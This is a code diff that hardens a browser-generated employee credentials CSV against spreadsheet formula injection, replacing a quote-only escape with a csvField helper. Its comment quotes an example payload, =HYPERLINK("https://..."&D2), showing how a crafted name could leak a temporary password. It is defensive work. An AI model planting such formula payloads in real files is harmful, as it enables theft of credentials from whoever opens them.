@@ -44,6 +44,7 @@ import {
   type UploadedFileAnalysis,
   type ValidationResult,
 } from "../../types/import";
+import { csvField } from "../../utils/csv";
 import { formatDateTime } from "../../utils/datetime";
 
 type Step = "upload" | "mapping" | "preview" | "done";
@@ -65,15 +66,24 @@ const stepOrder: Array<{ id: Step; label: string }> = [
   { id: "done", label: "Summary" },
 ];
 
-/** Builds a credentials CSV in the browser; the server never stores these. */
+/**
+ * Builds a credentials CSV in the browser; the server never stores these.
+ *
+ * Every field goes through csvField, which neutralises formulas before quoting.
+ * It used to quote only. Names and employee numbers come from the uploaded
+ * file, and the same row carries a temporary password, so a crafted name such
+ * as =HYPERLINK("https://..."&D2) could send that password elsewhere the
+ * moment an administrator opened the file. Separately, generated passwords are
+ * base64url and one in 64 begins with "-", which Excel read as a formula and
+ * displayed as #NAME? - destroying the only copy of that employee's password.
+ * The apostrophe marker fixes both, and is hidden by the spreadsheet.
+ */
 function downloadCredentials(credentials: ImportCredential[]): void {
-  const escape = (value: string) =>
-    /[",\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
   const csv = [
     "employee_number,full_name,email,temporary_password",
     ...credentials.map((credential) =>
       [credential.employee_number, credential.full_name, credential.email, credential.temporary_password]
-        .map(escape)
+        .map(csvField)
         .join(","),
     ),
   ].join("\r\n");
